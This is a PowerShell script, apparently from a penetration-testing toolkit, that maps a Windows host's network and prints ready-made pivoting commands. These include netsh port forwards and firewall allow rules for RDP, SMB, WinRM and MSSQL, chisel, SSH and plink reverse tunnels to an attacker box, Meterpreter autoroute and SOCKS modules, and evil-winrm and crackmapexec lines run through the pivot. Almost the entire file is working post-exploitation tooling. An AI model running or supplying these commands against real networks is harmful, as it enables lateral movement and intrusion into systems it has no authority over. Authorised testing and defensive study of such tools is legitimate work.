<#
.SYNOPSIS
    Network Recon & Pivot Command Generator
.DESCRIPTION
    Discovers network interfaces, ARP cache, routes, and generates ready-to-use pivot commands
.AUTHOR
    Pentest Toolkit
#>

# Colors for output
function Write-Banner { param($text) Write-Host "`n$("="*60)`n $text`n$("="*60)" -ForegroundColor Cyan }
function Write-Section { param($text) Write-Host "`n[+] $text" -ForegroundColor Green }
function Write-Cmd { param($text) Write-Host "    $text" -ForegroundColor Yellow }

Write-Banner "NETWORK RECON & PIVOT COMMAND GENERATOR"

# Get basic system info
Write-Section "HOSTNAME & DOMAIN"
$hostname = $env:COMPUTERNAME
$domain = (Get-WmiObject Win32_ComputerSystem).Domain
Write-Host "    Hostname: $hostname"
Write-Host "    Domain: $domain"

# Get all network interfaces
Write-Section "NETWORK INTERFACES"
$interfaces = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" }
$interfaces | ForEach-Object {
    $ifIndex = $_.InterfaceIndex
    $ifAlias = $_.InterfaceAlias
    $ip = $_.IPAddress
    $prefix = $_.PrefixLength
    Write-Host "    [$ifIndex] $ifAlias : $ip/$prefix" -ForegroundColor White
}

# Get default gateway
Write-Section "DEFAULT GATEWAYS"
Get-NetRoute -DestinationPrefix "0.0.0.0/0" | ForEach-Object {
    Write-Host "    Interface $($_.InterfaceIndex): $($_.NextHop)"
}

# Get ARP cache
Write-Section "ARP CACHE (Live Hosts)"
Get-NetNeighbor -State Reachable,Permanent,Stale | Where-Object { $_.IPAddress -notmatch "^(ff|fe80)" } | ForEach-Object {
    Write-Host "    $($_.IPAddress) - $($_.LinkLayerAddress) [$($_.State)]"
}

# Get routing table
Write-Section "ROUTING TABLE (Non-default)"
Get-NetRoute | Where-Object { $_.DestinationPrefix -ne "0.0.0.0/0" -and $_.DestinationPrefix -notmatch "^(255|224|ff|127)" } | 
    Select-Object DestinationPrefix, NextHop, InterfaceIndex -First 15 | ForEach-Object {
    Write-Host "    $($_.DestinationPrefix) via $($_.NextHop) [IF:$($_.InterfaceIndex)]"
}

# Get DNS servers
Write-Section "DNS SERVERS"
Get-DnsClientServerAddress -AddressFamily IPv4 | Where-Object { $_.ServerAddresses } | ForEach-Object {
    Write-Host "    $($_.InterfaceAlias): $($_.ServerAddresses -join ', ')"
}

# Get listening ports
Write-Section "LISTENING PORTS"
Get-NetTCPConnection -State Listen | Where-Object { $_.LocalAddress -ne "127.0.0.1" } | 
    Select-Object LocalAddress, LocalPort -Unique | Sort-Object LocalPort | ForEach-Object {
    Write-Host "    $($_.LocalAddress):$($_.LocalPort)"
}

# Get established connections
Write-Section "ESTABLISHED CONNECTIONS (Remote)"
Get-NetTCPConnection -State Established | Where-Object { $_.RemoteAddress -notmatch "^(127\.|::1)" } | 
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 10 | ForEach-Object {
    Write-Host "    $($_.LocalAddress):$($_.LocalPort) <-> $($_.RemoteAddress):$($_.RemotePort)"
}

# Network shares
Write-Section "NETWORK SHARES"
Get-SmbShare | Where-Object { $_.Name -notmatch '^\$' } | ForEach-Object {
    Write-Host "    $($_.Name) -> $($_.Path)"
}

# Now generate pivot commands
Write-Banner "PIVOT COMMANDS GENERATOR"

# Get the IPs for command generation
$myIPs = ($interfaces | Select-Object -ExpandProperty IPAddress)
$primaryIP = $myIPs | Select-Object -First 1

Write-Section "YOUR IPs ON THIS BOX"
$myIPs | ForEach-Object { Write-Host "    $_" -ForegroundColor White }

# Detect potential target networks
$targetNets = @()
Get-NetRoute | Where-Object { 
    $_.DestinationPrefix -match "^\d+\.\d+\.\d+\.\d+/\d+$" -and 
    $_.DestinationPrefix -notmatch "^(0\.|127\.|224\.|255\.)" -and
    $_.NextHop -ne "0.0.0.0"
} | ForEach-Object { $targetNets += $_.DestinationPrefix }

# Add networks from ARP
Get-NetNeighbor -State Reachable,Stale | Where-Object { $_.IPAddress -match "^\d+\.\d+\.\d+\.\d+$" } | ForEach-Object {
    $octets = $_.IPAddress -split "\."
    $net = "$($octets[0]).$($octets[1]).$($octets[2]).0/24"
    if ($net -notin $targetNets) { $targetNets += $net }
}

Write-Section "DETECTED TARGET NETWORKS"
$targetNets | Select-Object -Unique | ForEach-Object { Write-Host "    $_" }

# Sample targets from ARP
$arpTargets = Get-NetNeighbor -State Reachable,Stale | 
    Where-Object { $_.IPAddress -match "^\d+\.\d+\.\d+\.\d+$" -and $_.IPAddress -notin $myIPs } |
    Select-Object -ExpandProperty IPAddress -First 5

Write-Banner "NETSH PORT FORWARDING"

Write-Section "RDP PIVOT (3389)"
foreach ($target in $arpTargets) {
    foreach ($listenIP in $myIPs) {
        Write-Cmd "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=$listenIP connectport=3389 connectaddress=$target"
    }
}

Write-Section "SMB PIVOT (445)"
foreach ($target in $arpTargets) {
    foreach ($listenIP in $myIPs) {
        Write-Cmd "netsh interface portproxy add v4tov4 listenport=8445 listenaddress=$listenIP connectport=445 connectaddress=$target"
    }
}

Write-Section "WINRM PIVOT (5985)"
foreach ($target in $arpTargets) {
    foreach ($listenIP in $myIPs) {
        Write-Cmd "netsh interface portproxy add v4tov4 listenport=5986 listenaddress=$listenIP connectport=5985 connectaddress=$target"
    }
}

Write-Section "HTTP PIVOT (80)"
foreach ($target in $arpTargets) {
    foreach ($listenIP in $myIPs) {
        Write-Cmd "netsh interface portproxy add v4tov4 listenport=8888 listenaddress=$listenIP connectport=80 connectaddress=$target"
    }
}

Write-Section "HTTPS PIVOT (443)"
foreach ($target in $arpTargets) {
    foreach ($listenIP in $myIPs) {
        Write-Cmd "netsh interface portproxy add v4tov4 listenport=8443 listenaddress=$listenIP connectport=443 connectaddress=$target"
    }
}

Write-Section "SSH PIVOT (22)"
foreach ($target in $arpTargets) {
    foreach ($listenIP in $myIPs) {
        Write-Cmd "netsh interface portproxy add v4tov4 listenport=2222 listenaddress=$listenIP connectport=22 connectaddress=$target"
    }
}

Write-Section "MSSQL PIVOT (1433)"
foreach ($target in $arpTargets) {
    foreach ($listenIP in $myIPs) {
        Write-Cmd "netsh interface portproxy add v4tov4 listenport=1434 listenaddress=$listenIP connectport=1433 connectaddress=$target"
    }
}

Write-Section "MANAGEMENT COMMANDS"
Write-Cmd "netsh interface portproxy show v4tov4"
Write-Cmd "netsh interface portproxy reset"
Write-Cmd "netsh interface portproxy delete v4tov4 listenport=PORT listenaddress=IP"

Write-Section "FIREWALL RULES (Run if blocked)"
foreach ($port in @(8080,8445,5986,8888,8443,2222,1434)) {
    Write-Cmd "netsh advfirewall firewall add rule name=`"Pivot$port`" dir=in action=allow protocol=tcp localport=$port"
}

Write-Banner "SSH TUNNELING (If OpenSSH Available)"

Write-Section "LOCAL PORT FORWARD"
foreach ($target in $arpTargets) {
    Write-Cmd "ssh -L 8080:${target}:3389 user@attackbox"
}

Write-Section "DYNAMIC SOCKS PROXY"
Write-Cmd "ssh -D 9050 user@attackbox"

Write-Section "REVERSE PORT FORWARD"
foreach ($listenIP in $myIPs) {
    Write-Cmd "ssh -R 8080:${listenIP}:3389 user@attackbox"
}

Write-Banner "CHISEL COMMANDS"

Write-Section "CHISEL SERVER (On Attack Box)"
Write-Cmd "chisel server -p 8000 --reverse"

Write-Section "CHISEL CLIENT (On This Pivot)"
foreach ($target in $arpTargets) {
    Write-Cmd "chisel client ATTACKBOX_IP:8000 R:8080:${target}:3389"
    Write-Cmd "chisel client ATTACKBOX_IP:8000 R:socks"
}

Write-Banner "PLINK (PuTTY) COMMANDS"

Write-Section "LOCAL PORT FORWARD"
foreach ($target in $arpTargets) {
    Write-Cmd "plink.exe -L 8080:${target}:3389 user@attackbox"
}

Write-Section "DYNAMIC SOCKS PROXY"
Write-Cmd "plink.exe -D 9050 user@attackbox"

Write-Banner "SOCAT COMMANDS (If Available)"

Write-Section "TCP PORT FORWARD"
foreach ($target in $arpTargets) {
    foreach ($listenIP in $myIPs) {
        Write-Cmd "socat TCP-LISTEN:8080,bind=$listenIP,fork TCP:${target}:3389"
    }
}

Write-Banner "METERPRETER COMMANDS"

Write-Section "ADD ROUTE"
foreach ($net in $targetNets) {
    Write-Cmd "run autoroute -s $net"
}

Write-Section "PORT FORWARD"
foreach ($target in $arpTargets) {
    Write-Cmd "portfwd add -l 8080 -p 3389 -r $target"
}

Write-Section "SOCKS PROXY"
Write-Cmd "use auxiliary/server/socks_proxy"
Write-Cmd "set SRVPORT 9050"
Write-Cmd "run"

Write-Banner "PROXYCHAINS USAGE (From Attack Box)"
Write-Cmd "proxychains xfreerdp /v:TARGET_IP /u:USER /p:PASS"
Write-Cmd "proxychains nmap -sT -Pn TARGET_IP"
Write-Cmd "proxychains evil-winrm -i TARGET_IP -u USER -p PASS"

Write-Banner "QUICK CONNECTION COMMANDS (From Attack Box)"

Write-Section "XFREERDP THROUGH PIVOT"
foreach ($listenIP in $myIPs) {
    Write-Cmd "xfreerdp /v:${listenIP}:8080 /u:USERNAME /p:PASSWORD"
}

Write-Section "SMB THROUGH PIVOT"
foreach ($listenIP in $myIPs) {
    Write-Cmd "smbclient -L //${listenIP} -p 8445 -U USERNAME"
    Write-Cmd "crackmapexec smb ${listenIP} --port 8445 -u USER -p PASS"
}

Write-Section "EVIL-WINRM THROUGH PIVOT"
foreach ($listenIP in $myIPs) {
    Write-Cmd "evil-winrm -i ${listenIP} -P 5986 -u USER -p PASS"
}

Write-Host "`n"
Write-Banner "SCAN COMPLETE"
Write-Host "Replace ATTACKBOX_IP with your attack machine IP" -ForegroundColor Magenta
Write-Host "Replace USERNAME/PASSWORD with valid credentials" -ForegroundColor Magenta
Write-Host "`n"
